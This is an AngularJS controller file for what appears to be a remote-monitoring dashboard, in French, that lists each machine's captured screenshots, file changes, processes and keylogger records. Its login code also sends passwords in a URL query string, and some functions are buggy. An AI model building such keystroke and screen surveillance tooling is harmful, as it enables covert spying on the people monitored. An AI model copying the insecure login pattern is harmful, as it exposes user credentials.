'use strict';

var app = angular.module('angularGoogleMapsTestApp', [ 'uiGmapgoogle-maps','ngMaterial', 'fc.paging','ui.bootstrap','dialogs.main','pascalprecht.translate','dialogs.default-translations'  ]);
// one initial marker
var marker1 = {
	id : 1,
	latitude : 37.769,
	longitude : -122.44
};

var markersDisplayed = 0;
var markersAdded = 0;
var maxMarkersToDisplay = 3;
var increment = 0.02;
var startingLongitude = -122.44;
var startingLatitude = 37.769;

app.controller('angularGoogleMapCtrl', function($scope) {

	$scope.map = {
		center : {
			latitude : 37.7699298,
			longitude : -122.4469157
		},
		zoom : 12
	};
	$scope.markers = [ {
		id : 1,
		latitude : 37.7699298,
		longitude : -122.4469157
	} ];

	$scope.removeMarkers = function() {
		$scope.markers = [];
		markersDisplayed = 0;
		markersAdded = 0;
	}

	$scope.toggleAddAndRemoveMarkers = function() {

		// if 3 displayed already, pop first one off of the array
		if (markersDisplayed >= 3) {
			markersDisplayed--;
			$scope.markers.shift();
		}
		// addd a new position
		markersDisplayed++;
		$scope.markers.push({
			id : markersAdded,
			latitude : startingLatitude,
			longitude : (startingLongitude + (markersAdded * increment))
		});
		markersAdded++;
	};

});


app.controller("indexController", function($scope, $http, $mdDialog, $mdMedia,$window,dialogs) {
	$scope.customFullscreen = $mdMedia('xs') || $mdMedia('sm');
	$scope.ispanel1showed = true;
	$scope.screenshot = null;
	$scope.pageScreenshotCourant = 1;
	$scope.pageSize = 5;
	$scope.$broadcast('dataloaded');

	
	
	$scope.user = null;
	$http.get("/currentUser").success(function(data) {
		$scope.user = data;
		$scope.getlastSession();
		$scope.getScreenshot();
		$scope.getFiles();
		$scope.getProcessus();
		$scope.getKeylogger();
	}).error(function(data) {
		$window.location = "/error";
	})
	
	$scope.userimageUrl = "/images/Icon.png";
	$scope.getlastSession = function()
	{
		$http.get("/session/last?machineName="+$scope.user.machineName).success(function(data){
			if(data != null)
			{
				if(data.action == "ouverture")
					{
					$scope.userimageUrl = "/images/userOnline.png";
					}else
						{
						$scope.userimageUrl = "/images/userOffline.png";
						}
			}
		})
	}
	
	
	$scope.getScreenshot = function() {
		$http.get(
				"/screenshot?machineName=" + $scope.user.machineName + "&page="
						+ ($scope.pageScreenshotCourant - 1) + "&size="
						+ $scope.pageSize).success(function(data) {
			$scope.screenshot = data;
			$scope.ispanel1showed = false;
			$scope.fonc();
		}).error(function(data) {
			dialogs.error("ERREUR","Erreur d'afficher les Screenshots! actualiser la page");
		})

	};
	$scope.gotoPage = function() {
		// $scope.pageScreenshotCourant = p;
		$scope.getScreenshot();
	};
	$scope.goToPageSuiv = function() {
		if ($scope.screenshot.totalPages - 1 != $scope.pageScreenshotCourant) {
			$scope.pageScreenshotCourant += 1;
			$scope.getScreenshot();
		}

	};

	$scope.goToPagePrec = function() {
		if ($scope.pageScreenshotCourant != 0) {
			$scope.pageScreenshotCourant -= 1;
			$scope.getScreenshot();
		}
	};
	$scope.alertmsg = "";
	$scope.deleteScreenshot = function(id, ev) {
		$http({
			method : "POST",
			url : "/screenshot/delete?id=" + id,
			data : angular.toJson($scope.form),
			headers : {
				'Content-Type' : 'application/json'
			}
		}).then(_success, _error);
	};
	function _success(response) {
		if($scope.nb ==1){
			$scope.getScreenshot();
			$scope.alertmsg = "Screenshot supprimer !";
			$scope.showAlert();
		}else if($scope.nb == 2){
			$scope.getFiles();
			$scope.alertmsg = "File supprimer !";
			$scope.showAlert();
		}else if($scope.nb == 3)
			{
			$scope.getProcessus();
			$scope.alertmsg = "Processus supprimer !";
			$scope.showAlert();
			}

	}

	function _error(response) {
		$scope.alertmsg = response.statusText;
		$scope.showAlert();
	}

	$scope.id = 0;
	$scope.nb=0;
	$scope.showConfirm = function(ev, id, nb) {
		$scope.id = id;
		$scope.nb = nb;
		// Appending dialog to document.body to cover sidenav in docs app
		var confirm = $mdDialog.confirm().title('tu veux supprimer vraiment?')
				.textContent("Supprimer l'image avec ID=" + id).ariaLabel(
						'Lucky day').targetEvent(ev).ok('OUI').cancel('NON');
		$mdDialog.show(confirm).then(function() {
			if ($scope.nb == 1) {
				$scope.deleteScreenshot($scope.id, ev);
			} else if ($scope.nb == 2) {
				$scope.deleteFile($scope.id, ev);
			}else if(nb == 3)
			{
				$scope.deleteProcessus($scope.id, ev);
			}

		}, function() {
			$scope.status = 'You decided to keep your debt.';
		});
	};

	$scope.showAlert = function(ev) {
		// Appending dialog to document.body to cover sidenav in docs app
		// Modal dialogs should fully cover application
		// to prevent interaction outside of dialog
		$mdDialog.show($mdDialog.alert().parent(
				angular.element(document.querySelector('#popupContainer')))
				.clickOutsideToClose(true).title('').textContent(
						$scope.alertmsg).ariaLabel('Alert Dialog Demo')
				.ok('OK').targetEvent(ev));
	};

	/*
	 * ************************************************** Files
	 * ********************************************************
	 */
	$scope.file = null;
	$scope.ispanel2showed = true;
	$scope.pageFileCourant = 1;
	function getFiles($http) {

	}
	$scope.getFiles = function() {
		$http.get(
				"/file?machineName=" + $scope.user.machineName + "&page="
						+ ($scope.pageFileCourant - 1) + "&size="
						+ ($scope.pageSize + 4)).success(function(data) {
			$scope.file = data;
			$scope.ispanel2showed = false;
			$scope.fonc();
		}).error(function(data) {
			dialogs.error("ERREUR","Erreur d'afficher les changements des fichiers! actualiser la page");
		})
	};

	$scope.gotoPageFile = function() {
		// $scope.pageScreenshotCourant = p;
		$scope.getFiles();
	};

	$scope.getMinString = function(ch) {
		if (ch != "") {
			ch = ch.substring(ch.lastIndexOf("/"));
			return ch;
		}
		return ch;

	}

	$scope.deleteFile = function(id, ev) {
		$http({
			method : "POST",
			url : "/file/delete?id=" + id,
			data : angular.toJson($scope.form),
			headers : {
				'Content-Type' : 'application/json'
			}
		}).then(_success, _error);
	};
	
	$scope.fonc = function()
	{
    	$(document).ready(function() {
    	    var heights = $(".tab1").map(function() {
    	        return $(this).height();
    	    }).get(),

    	    maxHeight = Math.max.apply(null, heights);
    	   // maxHeight = maxHeight +10;
    	    $(".pan1").height(maxHeight);
    	});
	}
	
	/************************************************ Processus ********************************************/
	
	$scope.processus = null;
	$scope.ispanel3showed = true;
	$scope.pageProcessCourant = 1;
	
	$scope.getProcessus = function() {
		$http.get(
				"/process?machineName=" + $scope.user.machineName + "&page="
						+ ($scope.pageProcessCourant - 1) + "&size="
						+ ($scope.pageSize + 4)).success(function(data) {
			$scope.processus = data;
			$scope.ispanel3showed = false;
			$scope.fonc1();
		}).error(function(data) {
			dialogs.error("ERREUR","Erreur d'afficher les changements des processus! actualiser la page");
		})
	};

	$scope.gotoPageProcessus = function() {
		// $scope.pageScreenshotCourant = p;
		$scope.getProcessus();
	};



	$scope.deleteProcessus = function(id, ev) {
		$http({
			method : "POST",
			url : "/process/delete?id=" + id,
			data : angular.toJson($scope.form),
			headers : {
				'Content-Type' : 'application/json'
			}
		}).then(_success, _error);
	};
	
	$scope.fonc1 = function()
	{
    	$(document).ready(function() {
    	    var heights = $(".tab2").map(function() {
    	        return $(this).height();
    	    }).get(),

    	    maxHeight = Math.max.apply(null, heights);
    	    //maxHeight = maxHeight +10;
    	    $(".pan2").height((maxHeight));
    	});
	}
	

	/***************************************** KEYLOGGER *****************************************/

	
	
	$scope.keylogger = null;
	$scope.ispanel4showed = true;
	$scope.pageKeyloggerCourant = 1;

	$scope.getKeylogger = function() {
		$http.get(
				"/keylogger?machineName=" + $scope.user.machineName + "&page="
						+ ($scope.pageKeyloggerCourant - 1) + "&size="
						+ ($scope.pageSize + 4)).success(function(data) {
			$scope.keylogger = data;
			$scope.ispanel4showed = false;
			$scope.fonc1();
		}).error(function(data) {
			dialogs.error("ERREUR","Erreur d'afficher les Keylogger! actualiser la page");
		})
	};

	$scope.gotoPageKeylogger = function() {
		// $scope.pageScreenshotCourant = p;
		$scope.getKeylogger();
	};



	$scope.deleteKeylogger = function(id, ev) {
		$http({
			method : "POST",
			url : "/keylogger/delete?id=" + id,
			data : angular.toJson($scope.form),
			headers : {
				'Content-Type' : 'application/json'
			}
		}).then(_success, _error);
	};

	$scope.getMinStringKeylogger = function(ch) {
		if (ch != "" && ch.length > 60) {
			alert(ch);
			ch = ch.substring(60);
			ch += " ...";
			return ch;
		}
		return ch;

	}


	

});





app.controller("myAppController", function($scope,$http,$window) {
	$scope.email = "";
	$scope.password = "";
	$scope.verifEmail = true;
	$scope.verifPassword = true;
	$scope.user = null;
	$scope.showButton = false;
	$scope.connecter = function(){		

		if($scope.email != "" && $scope.password != "")
		{
			$http.get("/user/login?email="+$scope.email+"&password="+$scope.password).success(function(data){
				$scope.user = data;		
				$cookies.putObject("user",data);				
				$window.location.href = '/index.html';
				//$scope.chargerOperations();
			}).error(function(data) {			
				$scope.errorMessage1 = data.message;
			})	
		}else{
			if($scope.email == "")
			{
				var mail = angular.element( document.querySelector( '#mail' ) );
				mail.addClass('has-error');
			}
			if($scope.password == "")
			{
				var pass = angular.element( document.querySelector( '#pass' ) );
				pass.addClass('has-error');
			}
		}		
	}
	
	$scope.verifmail = function(){
		var myEl = angular.element( document.querySelector( '#mail' ) );
		if($scope.email == ""){
			myEl.addClass('has-error');
			$scope.showButton = false;
		}
		else{
			myEl.removeClass('has-error');
		}
		if($scope.email != "" && $scope.password != "")
			{
			$scope.showButton = true;}
		}
	$scope.verifpass = function(){
		var myEl = angular.element( document.querySelector( '#pass' ) );
		if($scope.password == ""){
			$scope.showButton = false;
			myEl.addClass('has-error');
		}else{
			myEl.removeClass('has-error');
		}
		if($scope.email != "" && $scope.password != "")
			{$scope.showButton = true;
			}
		
	}
});
